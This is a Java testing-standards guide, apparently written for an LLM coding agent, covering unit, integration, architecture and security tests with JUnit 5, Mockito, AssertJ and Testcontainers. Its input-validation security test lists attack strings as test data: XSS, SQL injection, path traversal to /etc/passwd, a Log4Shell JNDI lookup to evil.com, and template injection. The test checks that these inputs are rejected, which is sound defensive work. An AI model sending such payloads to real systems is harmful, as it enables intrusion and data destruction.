---
description: "Testing standards and best practices for Java projects using JUnit 5, Mockito, AssertJ, Testcontainers, and Spring Boot Test."
---

# Testing Standards — Java

## General Principles

- Every feature must have tests **before** being merged.
- Follow the **Testing Pyramid**: many unit tests, fewer integration tests, minimal E2E.
- Tests are **documentation** — a reader should understand the behavior from test names alone.
- Tests must be **deterministic** — no flaky tests, no external dependencies without containers, no time-sensitive logic without mocking.
- **Security tests** are mandatory for every endpoint and input handler.

## Test File Organization

```
src/
├── main/java/com/example/
│   ├── domain/
│   │   └── user/
│   │       ├── User.java
│   │       └── UserService.java
│   └── web/
│       └── UserController.java
└── test/java/com/example/
    ├── domain/
    │   └── user/
    │       ├── UserTest.java                    # Unit test
    │       └── UserServiceTest.java             # Unit test
    ├── web/
    │   └── UserControllerTest.java              # WebMvc test
    └── integration/
        ├── UserRepositoryIntegrationTest.java   # DB integration test
        └── UserApiIntegrationTest.java          # Full API integration test
```

- **Unit tests**: mirror the main source tree, `*Test.java` suffix.
- **Integration tests**: in an `integration` package, `*IntegrationTest.java` suffix.
- **Architecture tests**: in an `architecture` package, using ArchUnit.

## JUnit 5 — Unit Tests

### Test Structure (Arrange-Act-Assert)

```java
@ExtendWith(MockitoExtension.class)
class UserServiceTest {

    @Mock
    private UserRepository userRepository;

    @Mock
    private PasswordEncoder passwordEncoder;

    @Mock
    private UserMapper userMapper;

    @InjectMocks
    private UserService userService;

    @Test
    @DisplayName("should return user DTO when user exists")
    void shouldReturnUserDtoWhenUserExists() {
        // Arrange
        var user = new User(1L, "Alice", "alice@example.com");
        var expectedDto = new UserDto(1L, "Alice", "alice@example.com", UserRole.VIEWER, Instant.now());
        when(userRepository.findById(1L)).thenReturn(Optional.of(user));
        when(userMapper.toDto(user)).thenReturn(expectedDto);

        // Act
        Optional<UserDto> result = userService.findById(1L);

        // Assert
        assertThat(result)
            .isPresent()
            .hasValueSatisfying(dto -> {
                assertThat(dto.name()).isEqualTo("Alice");
                assertThat(dto.email()).isEqualTo("alice@example.com");
            });

        verify(userRepository).findById(1L);
        verifyNoMoreInteractions(userRepository);
    }

    @Test
    @DisplayName("should throw NotFoundException when user does not exist")
    void shouldThrowNotFoundExceptionWhenUserDoesNotExist() {
        // Arrange
        when(userRepository.findById(999L)).thenReturn(Optional.empty());

        // Act & Assert
        assertThatThrownBy(() -> userService.getById(999L))
            .isInstanceOf(NotFoundException.class)
            .hasMessageContaining("999");
    }
}
```

### Naming Convention

```java
// Pattern: should<ExpectedBehavior>When<Condition>
@Test void shouldReturnEmptyListWhenNoUsersMatchFilter() { ... }
@Test void shouldThrowValidationExceptionWhenEmailFormatIsInvalid() { ... }
@Test void shouldPublishEventWhenUserCreatedSuccessfully() { ... }
```

### Nested Tests

```java
@DisplayName("UserService")
class UserServiceTest {

    @Nested
    @DisplayName("create")
    class Create {
        @Test
        @DisplayName("should create user with hashed password")
        void shouldCreateUserWithHashedPassword() { ... }

        @Test
        @DisplayName("should throw DuplicateEmailException when email exists")
        void shouldThrowDuplicateEmailExceptionWhenEmailExists() { ... }
    }

    @Nested
    @DisplayName("findById")
    class FindById {
        @Test
        @DisplayName("should return user when exists")
        void shouldReturnUserWhenExists() { ... }

        @Test
        @DisplayName("should return empty when not found")
        void shouldReturnEmptyWhenNotFound() { ... }
    }
}
```

### Parameterized Tests

```java
@ParameterizedTest
@CsvSource({
    "alice@example.com, true",
    "bob@sub.domain.com, true",
    "invalid, false",
    "@missing.com, false",
    "user@, false",
    "'', false"
})
@DisplayName("should validate email format")
void shouldValidateEmailFormat(String input, boolean expected) {
    assertThat(EmailValidator.isValid(input)).isEqualTo(expected);
}

@ParameterizedTest
@MethodSource("invalidUserRequests")
@DisplayName("should reject invalid user creation requests")
void shouldRejectInvalidRequests(CreateUserRequest request, String expectedField) {
    var violations = validator.validate(request);
    assertThat(violations)
        .isNotEmpty()
        .anyMatch(v -> v.getPropertyPath().toString().equals(expectedField));
}

static Stream<Arguments> invalidUserRequests() {
    return Stream.of(
        Arguments.of(new CreateUserRequest("", "a@b.com", "Pass1234"), "name"),
        Arguments.of(new CreateUserRequest("Alice", "invalid", "Pass1234"), "email"),
        Arguments.of(new CreateUserRequest("Alice", "a@b.com", "short"), "password")
    );
}
```

## AssertJ Assertions

```java
// ✅ Use AssertJ for fluent, readable assertions
assertThat(users)
    .hasSize(3)
    .extracting(User::getName)
    .containsExactly("Alice", "Bob", "Charlie");

assertThat(result)
    .isNotNull()
    .satisfies(user -> {
        assertThat(user.getName()).isEqualTo("Alice");
        assertThat(user.getEmail()).endsWith("@example.com");
        assertThat(user.getCreatedAt()).isBeforeOrEqualTo(Instant.now());
    });

// ✅ Exception assertions
assertThatThrownBy(() -> service.delete(999L))
    .isInstanceOf(NotFoundException.class)
    .hasMessageContaining("User")
    .hasMessageContaining("999");

assertThatCode(() -> service.validate(validRequest))
    .doesNotThrowAnyException();

// ❌ Don't use JUnit's assertEquals — use AssertJ
assertEquals("Alice", user.getName()); // ❌
assertThat(user.getName()).isEqualTo("Alice"); // ✅
```

## Mockito Mocking

```java
// ✅ Use @Mock + @InjectMocks with MockitoExtension
@ExtendWith(MockitoExtension.class)
class OrderServiceTest {
    @Mock private OrderRepository orderRepository;
    @Mock private PaymentGateway paymentGateway;
    @InjectMocks private OrderService orderService;

    // ✅ Strict stubbing (default in MockitoExtension)
    @Test
    void shouldProcessPayment() {
        when(paymentGateway.charge(any())).thenReturn(new PaymentSuccess("txn-123"));
        // ...
        verify(paymentGateway).charge(argThat(req -> req.amount() == 9900));
    }
}

// ✅ Use BDDMockito for BDD-style
given(userRepository.findById(1L)).willReturn(Optional.of(user));
// ... action ...
then(userRepository).should().findById(1L);

// ❌ Never mock value objects, DTOs, or records
// ❌ Never mock what you don't own — use integration tests
```

## Spring Boot — Integration Tests

### WebMvc Tests (Controller Layer)

```java
@WebMvcTest(UserController.class)
@Import(SecurityConfig.class)
class UserControllerTest {

    @Autowired
    private MockMvc mockMvc;

    @MockBean
    private UserService userService;

    @Test
    @WithMockUser(roles = "ADMIN")
    @DisplayName("GET /api/v1/users/{id} should return user when found")
    void shouldReturnUserWhenFound() throws Exception {
        var user = new UserDto(1L, "Alice", "alice@example.com", UserRole.ADMIN, Instant.now());
        when(userService.findById(1L)).thenReturn(Optional.of(user));

        mockMvc.perform(get("/api/v1/users/1")
                .accept(MediaType.APPLICATION_JSON))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.name").value("Alice"))
            .andExpect(jsonPath("$.email").value("alice@example.com"));
    }

    @Test
    @DisplayName("POST /api/v1/users should reject invalid email")
    @WithMockUser(roles = "ADMIN")
    void shouldRejectInvalidEmail() throws Exception {
        String body = """
            {"name": "Alice", "email": "invalid", "password": "Pass1234"}
            """;

        mockMvc.perform(post("/api/v1/users")
                .contentType(MediaType.APPLICATION_JSON)
                .content(body))
            .andExpect(status().isBadRequest())
            .andExpect(jsonPath("$.errors.email").exists());
    }
}
```

### Full Integration Tests (Testcontainers)

```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@Testcontainers
@ActiveProfiles("test")
class UserApiIntegrationTest {

    @Container
    static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>("postgres:16-alpine")
        .withDatabaseName("testdb")
        .withUsername("test")
        .withPassword("test");

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.datasource.url", postgres::getJdbcUrl);
        registry.add("spring.datasource.username", postgres::getUsername);
        registry.add("spring.datasource.password", postgres::getPassword);
    }

    @Autowired
    private TestRestTemplate restTemplate;

    @Test
    @DisplayName("should create and retrieve a user through the API")
    void shouldCreateAndRetrieveUser() {
        // Create
        var request = new CreateUserRequest("Alice", "alice@example.com", "Pass1234");
        var createResponse = restTemplate.postForEntity("/api/v1/users", request, UserDto.class);
        assertThat(createResponse.getStatusCode()).isEqualTo(HttpStatus.CREATED);
        assertThat(createResponse.getBody()).isNotNull();

        Long userId = createResponse.getBody().id();

        // Retrieve
        var getResponse = restTemplate.getForEntity("/api/v1/users/" + userId, UserDto.class);
        assertThat(getResponse.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(getResponse.getBody().name()).isEqualTo("Alice");
    }
}
```

### Repository Tests

```java
@DataJpaTest
@Testcontainers
@ActiveProfiles("test")
class UserRepositoryIntegrationTest {

    @Container
    static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>("postgres:16-alpine");

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.datasource.url", postgres::getJdbcUrl);
        registry.add("spring.datasource.username", postgres::getUsername);
        registry.add("spring.datasource.password", postgres::getPassword);
    }

    @Autowired
    private UserRepository userRepository;

    @Test
    @DisplayName("should find user by email (case-insensitive)")
    void shouldFindByEmailIgnoreCase() {
        userRepository.save(new User("Alice", "alice@example.com"));

        Optional<User> found = userRepository.findByEmailIgnoreCase("ALICE@EXAMPLE.COM");

        assertThat(found).isPresent()
            .hasValueSatisfying(u -> assertThat(u.getName()).isEqualTo("Alice"));
    }
}
```

## Architecture Tests (ArchUnit)

```java
@AnalyzeClasses(packages = "com.example", importOptions = ImportOption.DoNotIncludeTests.class)
class ArchitectureTest {

    @ArchTest
    static final ArchRule domainShouldNotDependOnInfra =
        noClasses().that().resideInAPackage("..domain..")
            .should().dependOnClassesThat().resideInAPackage("..infra..");

    @ArchTest
    static final ArchRule controllersShouldNotAccessRepositories =
        noClasses().that().resideInAPackage("..web..")
            .should().dependOnClassesThat().resideInAPackage("..repository..");

    @ArchTest
    static final ArchRule servicesShouldBeAnnotated =
        classes().that().resideInAPackage("..service..")
            .and().haveSimpleNameEndingWith("Service")
            .should().beAnnotatedWith(Service.class);

    @ArchTest
    static final ArchRule noFieldInjection =
        noFields().should().beAnnotatedWith(Autowired.class)
            .because("Use constructor injection instead of field injection");
}
```

## Security Tests

> Security tests are **mandatory** for every API endpoint. Tag them with `@Tag("security")`.

### Authentication & Authorization

```java
@WebMvcTest(UserController.class)
@Tag("security")
class UserControllerSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @MockBean
    private UserService userService;

    @Test
    @DisplayName("should return 401 for unauthenticated requests")
    void shouldReturn401ForUnauthenticatedRequests() throws Exception {
        mockMvc.perform(get("/api/v1/users/1"))
            .andExpect(status().isUnauthorized());
    }

    @Test
    @WithMockUser(roles = "VIEWER")
    @DisplayName("should return 403 when user lacks admin role")
    void shouldReturn403WhenUserLacksAdminRole() throws Exception {
        mockMvc.perform(delete("/api/v1/users/1"))
            .andExpect(status().isForbidden());
    }

    @Test
    @WithMockUser(roles = "ADMIN")
    @DisplayName("should allow admin to delete users")
    void shouldAllowAdminToDeleteUsers() throws Exception {
        mockMvc.perform(delete("/api/v1/users/1"))
            .andExpect(status().isNoContent());
    }
}
```

### Input Validation & Injection Prevention

```java
@Tag("security")
class InputValidationSecurityTest {

    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/exploit}",  // Log4Shell
        "{{7*7}}", // Template injection
    })
    @DisplayName("should reject malicious input")
    void shouldRejectMaliciousInput(String maliciousInput) {
        var request = new CreateUserRequest(maliciousInput, "a@b.com", "Pass1234");
        var violations = validator.validate(request);
        assertThat(violations).isNotEmpty();
    }
}
```

### Error Response Leakage

```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@Tag("security")
class ErrorResponseSecurityTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @Test
    @DisplayName("should not expose stack traces in error responses")
    void shouldNotExposeStackTraces() {
        var response = restTemplate.getForEntity("/api/v1/nonexistent", String.class);
        String body = response.getBody();

        assertThat(body).doesNotContain("at ");
        assertThat(body).doesNotContain("stackTrace");
        assertThat(body).doesNotContain("com.example");
        assertThat(body).doesNotContain(".java:");
    }
}
```

## Code Coverage

### Maven (JaCoCo)

```xml
<plugin>
    <groupId>org.jacoco</groupId>
    <artifactId>jacoco-maven-plugin</artifactId>
    <executions>
        <execution>
            <goals><goal>prepare-agent</goal></goals>
        </execution>
        <execution>
            <id>report</id>
            <phase>verify</phase>
            <goals><goal>report</goal></goals>
        </execution>
        <execution>
            <id>check</id>
            <phase>verify</phase>
            <goals><goal>check</goal></goals>
            <configuration>
                <rules>
                    <rule>
                        <limits>
                            <limit>
                                <counter>LINE</counter>
                                <minimum>0.80</minimum>
                            </limit>
                            <limit>
                                <counter>BRANCH</counter>
                                <minimum>0.80</minimum>
                            </limit>
                        </limits>
                    </rule>
                </rules>
            </configuration>
        </execution>
    </executions>
</plugin>
```

### Targets

| Metric | Minimum | Recommended |
|--------|---------|-------------|
| Line coverage | 80% | 90%+ |
| Branch coverage | 80% | 85%+ |
| Security-critical code | 95% | 100% |

## Test Data

```java
// ✅ Use builder/factory pattern for test data
class TestUsers {
    static User alice() {
        return new User(1L, "Alice", "alice@example.com", UserRole.ADMIN);
    }

    static User bob() {
        return new User(2L, "Bob", "bob@example.com", UserRole.VIEWER);
    }

    static CreateUserRequest validRequest() {
        return new CreateUserRequest("Alice", "alice@example.com", "Pass1234");
    }

    static User withRole(UserRole role) {
        return new User(99L, "TestUser", "test@example.com", role);
    }
}
```

## Maven Profiles

```xml
<!-- Unit tests (default) -->
<profile>
    <id>unit-test</id>
    <activation><activeByDefault>true</activeByDefault></activation>
    <properties>
        <surefire.excludes>**/*IntegrationTest.java</surefire.excludes>
    </properties>
</profile>

<!-- Integration tests -->
<profile>
    <id>integration-test</id>
    <properties>
        <surefire.includes>**/*IntegrationTest.java</surefire.includes>
    </properties>
</profile>
```

## LLM Agent Directives

When generating or modifying tests, the agent MUST:

- Use JUnit 5 with `@ExtendWith(MockitoExtension.class)` for unit tests.
- Use AssertJ for all assertions — never JUnit's `assertEquals`/`assertTrue`.
- Follow Arrange-Act-Assert pattern with clear section comments.
- Use `@DisplayName` with the pattern: `should <expected> when <condition>`.
- Use `@ParameterizedTest` with `@CsvSource` or `@MethodSource` for 3+ cases.
- Use `@Nested` classes to group tests by method or scenario.
- Mock only interfaces/abstractions — never mock records, DTOs, or value objects.
- Include security tests tagged with `@Tag("security")` for every endpoint.
- Use Testcontainers for database integration tests — never H2 in production-like tests.
- Never generate tests that depend on execution order.
- Use test data factories instead of inline object construction.
- Verify `@WithMockUser` roles match the endpoint's security requirements.
